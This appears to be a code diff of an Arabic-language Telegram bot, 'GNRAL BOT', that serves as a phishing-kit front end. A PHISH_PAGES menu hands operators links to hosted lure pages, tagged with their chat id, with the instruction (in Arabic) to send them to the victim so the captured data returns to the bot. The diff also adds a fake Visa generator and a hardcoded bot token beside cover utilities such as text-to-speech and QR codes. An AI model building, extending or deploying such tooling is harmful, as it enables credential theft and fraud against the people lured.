@@ -1,9 +1,9 @@
-import os, sys, subprocess, time, threading, random, string, json, logging, io
+```python
+import os, sys, subprocess, time, threading, random, string, logging, io
 import requests
 
-# ========== تثبيت تلقائي للمكتبات (أسماء صحيحة) ==========
-def install(package, import_name=None):
-    """تثبيت المكتبة إذا لم تكن موجودة"""
+# ========== تثبيت تلقائي (مع تجاهل أخطاء المكتبات غير الضرورية) ==========
+def safe_install(package, import_name=None):
     name = import_name or package
     try:
         __import__(name)
@@ -11,31 +11,29 @@ def install(package, import_name=None):
         try:
             subprocess.check_call([sys.executable, "-m", "pip", "install", package, "--quiet"])
         except:
-            pass  # نتجاهل الفشل لتجنب انهيار التطبيق
+            pass
 
-# المكتبات الأساسية
-install("flask", "flask")
-install("requests", "requests")
-install("pyTelegramBotAPI", "telebot")
-# مكتبات الأدوات
-install("gTTS", "gtts")          # تحويل النص إلى صوت
-install("qrcode[pil]", "qrcode") # باركود مع PIL
-install("Pillow", "PIL")         # معالجة الصور (للباركود)
-install("pyshorteners", "pyshorteners") # اختصار الروابط
-install("deep_translator", "deep_translator") # ترجمة
+safe_install("flask", "flask")
+safe_install("requests", "requests")
+safe_install("pyTelegramBotAPI", "telebot")
+safe_install("gTTS", "gtts")
+safe_install("qrcode[pil]", "qrcode")
+safe_install("Pillow", "PIL")
+safe_install("pyshorteners", "pyshorteners")
+safe_install("deep-translator", "deep_translator")
 
-# استيراد المكتبات بعد التثبيت
 from flask import Flask, request
 from telebot import TeleBot, types
 from io import BytesIO
 
 # ========== الإعدادات ==========
 TOKEN = "8558243002:AAGTsGfVX5IfQERVDksCP0crVIYIB6ethqs"
-BASE_URL = "https://fgnral-html-5waj.onrender.com"   # رابط الصفحات
-APP_URL = "https://gamee-beqx.onrender.com"           # رابط تطبيق البوت
+BASE_URL = "https://fgnral-html-5waj.onrender.com"   # رابط استضافة الصفحات
+APP_URL = "https://gamee-h4uf.onrender.com"           # رابط تطبيق البوت
 
 bot = TeleBot(TOKEN, threaded=False)
 app = Flask(__name__)
+
 user_states = {}
 bot_rating = 0
 
@@ -52,7 +50,7 @@ PHISH_PAGES = [
     ("📱 فحص مواصفات الجهاز", "device.html")
 ]
 
-# ========== دوال الأدوات ==========
+# ========== دوال مساعدة للأدوات ==========
 def generate_password(length=16):
     chars = string.ascii_letters + string.digits + "!@#$%^&*()"
     return ''.join(random.choice(chars) for _ in range(length))
@@ -68,13 +66,15 @@ def generate_fake_visa():
 
 def shorten_url(url):
     try:
-        s = pyshorteners.Shortener()
+        from pyshorteners import Shortener
+        s = Shortener()
         return s.tinyurl.short(url)
     except:
-        try:
-            r = requests.get(f"https://tinyurl.com/api-create.php?url={requests.utils.quote(url)}", timeout=5)
-            if r.status_code == 200: return r.text.strip()
-        except: pass
+        pass
+    try:
+        r = requests.get(f"https://tinyurl.com/api-create.php?url={requests.utils.quote(url)}", timeout=5)
+        if r.status_code == 200: return r.text.strip()
+    except: pass
     return url
 
 def text_to_speech(text, lang='ar'):
@@ -141,7 +141,8 @@ def read_qr_from_image(file_bytes):
 def webhook():
     if request.headers.get('content-type') == 'application/json':
         try:
-            update = types.Update.de_json(request.get_data().decode('utf-8'))
+            json_string = request.get_data().decode('utf-8')
+            update = types.Update.de_json(json_string)
             bot.process_new_updates([update])
             return ''
         except Exception as e:
@@ -158,7 +159,7 @@ def start(msg):
     chat_id = msg.chat.id
     markup = types.InlineKeyboardMarkup(row_width=2)
 
-    # صفوف الصفحات (8 أزواج + زر عريض)
+    # 1. صفوف الصفحات (8 أزواج + زر عريض)
     for i in range(0, len(PHISH_PAGES) - 1, 2):
         left = PHISH_PAGES[i]; right = PHISH_PAGES[i+1]
         markup.row(types.InlineKeyboardButton(left[0], callback_data=f"ph|{left[1]}"),
@@ -166,55 +167,61 @@ def start(msg):
     last = PHISH_PAGES[-1]
     markup.row(types.InlineKeyboardButton(last[0], callback_data=f"ph|{last[1]}"))
 
-    # صفوف الأدوات
+    # 2. الأدوات
     markup.row(types.InlineKeyboardButton("🔊 نص إلى صوت", callback_data="tts"),
                types.InlineKeyboardButton("✨ زخرفة نصوص", callback_data="decor"))
     markup.row(types.InlineKeyboardButton("🔗 اختصار رابط", callback_data="shorten"),
                types.InlineKeyboardButton("🔐 توليد كلمة سر", callback_data="genpass"))
     markup.row(types.InlineKeyboardButton("🌐 ترجمة", callback_data="translate"),
                types.InlineKeyboardButton("📧 بريد وهمي", callback_data="tempmail"))
-    markup.row(types.InlineKeyboardButton("🔍 فحص رابط", callback_data="checklink"),
-               types.InlineKeyboardButton("📸 إنشاء باركود", callback_data="createqr"))
-    markup.row(types.InlineKeyboardButton("📷 قراءة باركود", callback_data="readqr"),
-               types.InlineKeyboardButton("💳 فيزا وهمية", callback_data="visa"))
-    markup.row(types.InlineKeyboardButton("🆔 معرفي", callback_data="myid"),
-               types.InlineKeyboardButton("📜 نصائح", callback_data="tips"))
-    markup.row(types.InlineKeyboardButton("💻 كيف تصبح هاكر", callback_data="hack"),
-               types.InlineKeyboardButton("📄 شروط", callback_data="terms"))
-    markup.row(types.InlineKeyboardButton("📖 شرح البوت", callback_data="help"),
-               types.InlineKeyboardButton("⭐ تقييم", callback_data="rate"))
+    markup.row(types.InlineKeyboardButton("📸 إنشاء باركود", callback_data="createqr"),
+               types.InlineKeyboardButton("📷 قراءة باركود", callback_data="readqr"))
+    markup.row(types.InlineKeyboardButton("💳 فيزا وهمية", callback_data="visa"),
+               types.InlineKeyboardButton("🆔 معرفي", callback_data="myid"))
+    markup.row(types.InlineKeyboardButton("📜 نصائح", callback_data="tips"),
+               types.InlineKeyboardButton("💻 كيف تصبح هاكر", callback_data="hack"))
+    markup.row(types.InlineKeyboardButton("📄 شروط", callback_data="terms"),
+               types.InlineKeyboardButton("📖 شرح البوت", callback_data="help"))
+    markup.row(types.InlineKeyboardButton("⭐ تقييم", callback_data="rate"),
+               types.InlineKeyboardButton("🔄 رجوع", callback_data="back"))
 
-    bot.send_message(chat_id, "🔱 <b>GNRAL BOT</b>\n\nاختر الخدمة:", parse_mode="HTML", reply_markup=markup)
+    wel = "🔱 <b>GNRAL BOT</b>\n\nاختر الخدمة التي تريدها:"
+    bot.send_message(chat_id, wel, parse_mode="HTML", reply_markup=markup)
 
 # ========== معالج الأزرار ==========
 @bot.callback_query_handler(func=lambda call: True)
 def callback_handler(call):
     chat_id = call.message.chat.id; data = call.data; msg_id = call.message.message_id
 
+    # الرجوع للقائمة الرئيسية
+    if data == "back":
+        start(call.message)
+        bot.answer_callback_query(call.id)
+        return
+
     # الصفحات الاحتيالية
     if data.startswith("ph|"):
         page = data.split("|")[1]
         link = f"{BASE_URL}/{page}?chat={chat_id}"
         markup = types.InlineKeyboardMarkup().add(types.InlineKeyboardButton("🔙 رجوع", callback_data="back"))
-        bot.edit_message_text(f"🔗 رابط الصفحة:\n<code>{link}</code>\n\nأرسله للضحية.", chat_id, msg_id, parse_mode="HTML", reply_markup=markup)
+        bot.edit_message_text(f"🔗 رابط الصفحة:\n<code>{link}</code>\n\nأرسله للضحية. البيانات ستصل إليك هنا.",
+                              chat_id, msg_id, parse_mode="HTML", reply_markup=markup)
+        bot.answer_callback_query(call.id)
+        return
 
-    elif data == "back":
-        start(call.message)
-
-    elif data == "tts":
+    # الأدوات
+    if data == "tts":
         user_states[chat_id] = "tts"; bot.send_message(chat_id, "🎙️ أرسل النص لتحويله إلى صوت:")
     elif data == "decor":
         user_states[chat_id] = "decor"; bot.send_message(chat_id, "✨ أرسل النص لزخرفته:")
     elif data == "shorten":
-        user_states[chat_id] = "shorten"; bot.send_message(chat_id, "🔗 أرسل الرابط:")
+        user_states[chat_id] = "shorten"; bot.send_message(chat_id, "🔗 أرسل الرابط لاختصاره:")
     elif data == "genpass":
         bot.send_message(chat_id, f"🔐 كلمة المرور:\n<code>{generate_password()}</code>", parse_mode="HTML")
     elif data == "translate":
-        user_states[chat_id] = "translate"; bot.send_message(chat_id, "🌐 أرسل النص:")
+        user_states[chat_id] = "translate"; bot.send_message(chat_id, "🌐 أرسل النص لترجمته:")
     elif data == "tempmail":
         bot.send_message(chat_id, create_temp_email())
-    elif data == "checklink":
-        user_states[chat_id] = "checklink"; bot.send_message(chat_id, "🔍 أرسل الرابط:")
     elif data == "createqr":
         user_states[chat_id] = "createqr"; bot.send_message(chat_id, "📸 أرسل النص لإنشاء باركود:")
     elif data == "readqr":
@@ -222,9 +229,9 @@ def callback_handler(call):
     elif data == "visa":
         bot.send_message(chat_id, generate_fake_visa())
     elif data == "myid":
-        bot.send_message(chat_id, f"🆔 معرفك: {call.from_user.id}")
+        bot.send_message(chat_id, f"🆔 معرف حسابك: {call.from_user.id}")
     elif data == "tips":
-        bot.send_message(chat_id, "📜 <b>نصائح</b>\n\n1. لا تشارك بياناتك مع أحد.\n2. استخدم كلمات مرور قوية.\n3. فعّل التحقق بخطوتين.", parse_mode="HTML")
+        bot.send_message(chat_id, "📜 <b>نصائح</b>\n\n1. لا تشارك بياناتك.\n2. استخدم كلمات مرور قوية.\n3. فعّل التحقق بخطوتين.", parse_mode="HTML")
     elif data == "hack":
         bot.send_message(chat_id, "💻 <b>كيف تصبح هاكر</b>\n\n1. Linux\n2. Python\n3. شبكات\n4. ثغرات الويب\n5. منصات تدريب (HTB, THM)", parse_mode="HTML")
     elif data == "terms":
@@ -234,6 +241,7 @@ def callback_handler(call):
     elif data == "rate":
         global bot_rating; bot_rating += 1
         bot.send_message(chat_id, f"⭐ شكراً! عدد التقييمات: {bot_rating}")
+
     bot.answer_callback_query(call.id)
 
 # ========== معالج النصوص التفاعلية ==========
@@ -259,11 +267,6 @@ def handle_shorten(m):
 def handle_translate(m):
     user_states.pop(m.chat.id, None)
     bot.send_message(m.chat.id, f"🌐 النص المترجم:\n{translate_text(m.text)}")
-
-@bot.message_handler(func=lambda m: user_states.get(m.chat.id) == "checklink")
-def handle_checklink(m):
-    user_states.pop(m.chat.id, None)
-    bot.send_message(m.chat.id, "وظيفة فحص الروابط تحتاج لتفعيل API خارجي")
 
 @bot.message_handler(content_types=['photo'])
 def handle_photo(m):
@@ -295,3 +298,4 @@ if __name__ == '__main__':
     bot.remove_webhook()
     bot.set_webhook(url=f"{APP_URL}/{TOKEN}")
     app.run(host='0.0.0.0', port=int(os.environ.get('PORT', 5000)))
+```
